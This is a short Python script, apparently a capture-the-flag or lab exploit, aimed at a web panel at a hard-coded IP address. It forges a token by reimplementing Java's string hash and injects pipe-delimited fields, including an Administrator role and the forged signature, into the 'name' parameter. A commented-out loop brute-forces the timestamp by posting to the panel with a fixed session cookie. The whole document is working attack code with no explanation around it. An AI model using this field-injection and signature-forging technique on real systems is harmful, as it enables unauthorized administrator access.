import requests

def java_string_hashcode(s):
    h = 0
    for c in s:
        h = (31 * h + ord(c)) & 0xFFFFFFFF
    return str(((h + 0x80000000) & 0xFFFFFFFF) - 0x80000000)

sess = requests.Session()

username = 'test'
name = 'test'
email = 'test@test.ca'
role = 'Administrator'

epoch = 1584579036
url = 'http://165.22.236.225:8888/panel'
cookies = {'JSESSIONID' : 'DA930644123FF7F7AF74C4B209A88C03'}

# user.getCreationTime() + PIPE_S + user.getUsername() + PIPE_S + user.getName() + PIPE_S + user.getEmail() + PIPE_S + user.getRole() + PIPE_S + signature
#for i in range(4):
#    signature = java_string_hashcode(str(epoch + i) + '%s%s%s%s' % (username, name, email, role))
#    name = '%s|%s|Administrator|%s' % (name, email, signature)
#   
#    params = {'name' : name, 'email' : email}
#    r = sess.post(url, data=params, cookies=cookies)
#    if not 'Your token is invalid..' in r.text:
#        #print name
#        #print email
#        #print str(epoch + i)
#        epoch += i
#        break

signature = java_string_hashcode(str(epoch) + '%s%s%s%s' % (username, name, email, role))
name = '%s|%s|%s|%s' % (name, email, role, signature)
print name

